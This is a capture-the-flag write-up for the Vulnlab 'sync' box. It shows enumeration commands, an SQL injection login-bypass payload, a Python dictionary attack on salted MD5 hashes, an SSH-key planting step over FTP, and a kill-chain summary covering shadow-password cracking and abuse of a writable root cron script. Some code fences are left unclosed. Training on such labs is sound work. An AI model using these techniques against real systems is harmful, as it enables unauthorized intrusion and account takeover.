## Introduction
------------------------------------------------------------------------------------------
[sync](https://www.vulnlab.com/machines) is an easy rated linux box from vulnlab. The machine has 4 ports opens: 21, 22, 80, 873 respectively running a vsftpd, ssh, Apache2 and rsync. To gain initial foothold you would have to abuse the anonymous acccess to the shared folder provided by the rsync service. Within this folder, youâ€™ll find a backup of the source code of the app running on port 80. Next read users hashes in the sqlite database and by understanding the hashing logic crack `triss` user password. The privilege escalation on the other hand involve cracking `/etc/shadow` passwords found at `/backup` and modifying a scheduled task running as root.

## Enumeration
We start by a full scan to discover all tcp opened ports...
### All Open Ports
```bash
rustscan -a 10.10.109.129
```

### Services Scanning
```bash
nmap -p21,22,80,873 -sC -sV -v -oN sync.full 10.10.109.129

### Hostname
```bash
echo '10.10.109.129  sync.vl'  >> /etc/hosts
```

## Foothold

### Port 80
![web](./assets/img/ctf/vulnlab/sync/sync3.png)
```bash
ffuf -c -u http://sync.vl/FUZZ -w /usr/share/wordlists/dirb/commons.txt -e .php
```
![ffuf](./assets/img/ctf/vulnlab/sync/sync4.png)

### Port 873
```bash
rsync sync.vl::
rsync -av --list-only  rsync://sync.vl/httpd 
```
![rsync](./assets/img/ctf/vulnlab/sync/sync5.png)

```bash
rsync -av rsync://sync.vl/httpd ./rsyn_shared
```
![rsync](./assets/img/ctf/vulnlab/sync/sync6.png)

```sql
sqlite3 site.db
select * from users;
```
![rsync](./assets/img/ctf/vulnlab/sync/sync7.png)
```php
$username = $_POST['username'];
$password = $_POST['password'];

$hash = md5("$secure|$username|$password");
$db = new SQLite3('../db/site.db');
$result = $db->query("SELECT * FROM users WHERE username = '$username' AND password= '$hash'");

$row = $result->fetchArray(SQLITE3_ASSOC);
```
Reading this portion of the app code we can identify that 2 things:
1. There is an SQL Injection, the username from client side is concatened directly in the SQL query.
```text
admin' or 1=1-- -
triss' or 1=1-- -
```
![sqli](./assets/img/ctf/vulnlab/sync/sync8.png)

2. The hashing algorithm used is md5 and a secured string concatenated with the username is used as salt. knowing this salt gives us an opportunity to recover users passwords. I have tried to crack with hashcat and jtr but failed, i guess i'm missing something. I then decided to write a simple python script to achieve it and that worked.

```python
import hashlib

secure = "6c4972f3717a5e881e282************"
username = "triss"
hash_to_crack = "a0de4d7f81676c3ea**********"
known_string = f"{secure}|{username}|"

def generate_md5_hash(password):
    full_string = known_string + password
    return hashlib.md5(full_string.encode()).hexdigest()
    
def dictionary_attack(wordlist):
    with open(wordlist, 'r') as file:
        for line in file:
            password = line.strip()
            if generate_md5_hash(password) == hash_to_crack:
                print(f"Password found: {password}")
                return password
    print("Password not found in wordlist.")

wordlist = "/usr/share/wordlists/rockyou.txt"
dictionary_attack(wordlist)
```
![triss password](./assets/img/ctf/vulnlab/sync/sync9.png)

### Port 21
```bash
ftp sync.vl
```
![ftp](./assets/img/ctf/vulnlab/sync/sync10.png)

```sh
ssh-keygen
cp id_rda.pub authorized_keys
mkdir .ssh
cd .ssh
put authorized_keys
```
![authorized_keys](./assets/img/ctf/vulnlab/sync/sync11.png)

### Port 22
```bash
chmod 600 id_rsa
ssh -i id_rsa triss@sync.vl
```
![ssh](./assets/img/ctf/vulnlab/sync/sync12.png)

```sh

## Kill Chain Summary
1. rsync anonymous access.
2. reading the registration code understand the hashing mechanism and crack triss password.
3. using triss creds access the ftp server.
4. tris have write permission abuse this and add a public key to `.ssh/authorized_keys`.
5. connect to the box trought ssh as triss.
6. crack linux password (sa and jennifer) found in `/backup/date.zip`.
7. abuse the root task running `/usr/local/bin/backup.sh` since we as `sa` has write permission on `/usr/local/bin/backup.sh`.
8. NB: Someone could using `hydra` brute force `sa` password since it's very weak and then skip step 1 to 5.
